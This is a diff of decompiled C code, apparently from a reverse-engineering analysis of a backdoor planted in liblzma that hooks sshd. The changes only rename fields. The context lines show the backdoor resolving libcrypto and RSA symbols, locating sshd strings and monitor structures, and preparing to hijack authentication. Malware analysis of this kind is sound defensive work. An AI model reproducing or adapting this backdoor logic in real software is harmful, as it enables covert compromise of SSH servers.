@@ -118,7 +118,7 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
     pbVar48 = (backdoor_data_t *)((long)&pbVar48->sshd_link_map + 4);
   }
   elf_handles = &local_980.elf_handles;
-  local_980.elf_handles.dynamic_linker = &local_980.dynamic_linker_info;
+  local_980.elf_handles.ldso = &local_980.dynamic_linker_info;
   local_980.elf_handles.libc = &local_980.libc_info;
   local_ac8 = 0;
   local_ac0 = (pfn_RSA_public_decrypt_t *)0x0;
@@ -128,7 +128,7 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   peVar49 = params->entry_ctx;
   local_980.elf_handles.liblzma = &local_980.liblzma_info;
   local_980.elf_handles.libcrypto = &local_980.libcrypto_info;
-  local_980.elf_handles.main = &local_980.main_info;
+  local_980.elf_handles.sshd = &local_980.main_info;
   local_980.data_handle.runtime_data = &local_980;
   local_980.data_handle.cached_elf_handles = elf_handles;
   update_got_address(peVar49);
@@ -265,10 +265,10 @@ LAB_00105951:
               *resolved_count_ptr = *resolved_count_ptr + 1;
             }
           }
-          elf_info = local_980.elf_handles.main;
+          elf_info = local_980.elf_handles.sshd;
           local_a30.instruction = (u8 *)0x0;
           local_9d8.instruction = (u8 *)0x0;
-          code_segment = elf_get_code_segment(local_980.elf_handles.main,(u64 *)&local_a30);
+          code_segment = elf_get_code_segment(local_980.elf_handles.sshd,(u64 *)&local_a30);
           sshd_code_end_ptr = local_a30.instruction + (long)code_segment;
           data_segment = elf_get_data_segment(elf_info,(u64 *)&local_9d8,FALSE);
           (local_b10->global_ctx).sshd_code_start = code_segment;
@@ -286,11 +286,11 @@ LAB_00105951:
             bn_bin2bn_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_bin2bn,0);
           }
           local_acc = STR_ssh_rsa_cert_v01_openssh_com;
-          pcVar37 = elf_find_string(local_980.elf_handles.main,&local_acc,(void *)0x0);
+          pcVar37 = elf_find_string(local_980.elf_handles.sshd,&local_acc,(void *)0x0);
           (local_b10->global_ctx).STR_ssh_rsa_cert_v01_openssh_com = pcVar37;
           if (pcVar37 == (char *)0x0) goto LAB_00105a60;
           local_acc = STR_rsa_sha2_256;
-          pcVar37 = elf_find_string(local_980.elf_handles.main,&local_acc,(void *)0x0);
+          pcVar37 = elf_find_string(local_980.elf_handles.sshd,&local_acc,(void *)0x0);
           (local_b10->global_ctx).STR_rsa_sha2_256 = pcVar37;
           if (pcVar37 == (char *)0x0) goto LAB_00105a60;
           bn_dup_sym = (Elf64_Sym *)0x0;
@@ -335,7 +335,7 @@ LAB_00105951:
             *resolved_count_ptr = *resolved_count_ptr + 1;
           }
           BVar26 = sshd_find_sensitive_data
-                             (local_980.elf_handles.main,local_980.elf_handles.libcrypto,
+                             (local_980.elf_handles.sshd,local_980.elf_handles.libcrypto,
                               &local_980.sshd_string_refs,imported_funcs,ctx);
           if (BVar26 == FALSE) goto LAB_00105a60;
           if (bn_bin2bn_sym != (Elf64_Sym *)0x0) {
@@ -367,14 +367,14 @@ LAB_00105951:
             (local_b10->imported_funcs).RSA_sign = (pfn_RSA_sign_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
           }
           bn_bin2bn_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
-          libcrypto_info = local_980.elf_handles.main;
+          libcrypto_info = local_980.elf_handles.sshd;
           sshd_ctx_cursor = (local_b10->global_ctx).sshd_ctx;
           local_a30.instruction = (u8 *)0x0;
           local_a98 = local_a98 & 0xffffffff00000000;
           sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
           sshd_ctx_cursor->have_mm_answer_authpassword = FALSE;
           sshd_ctx_cursor->have_mm_answer_keyverify = FALSE;
-          code_segment = elf_get_data_segment(local_980.elf_handles.main,(u64 *)&local_a30,FALSE);
+          code_segment = elf_get_data_segment(local_980.elf_handles.sshd,(u64 *)&local_a30,FALSE);
           sshd_code_end_ptr = local_a30.instruction;
           if ((code_segment != (void *)0x0) &&
              (local_980.sshd_string_refs.entries[0x12].func_start != (void *)0x0)) {
@@ -548,7 +548,7 @@ LAB_001064b8:
   }
 LAB_001065af:
   bn_dup_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
-  BVar26 = sshd_find_monitor_struct(local_980.elf_handles.main,&local_980.sshd_string_refs,ctx);
+  BVar26 = sshd_find_monitor_struct(local_980.elf_handles.sshd,&local_980.sshd_string_refs,ctx);
   if (BVar26 == FALSE) {
     (local_b10->sshd_ctx).have_mm_answer_keyallowed = FALSE;
     (local_b10->sshd_ctx).have_mm_answer_keyverify = FALSE;
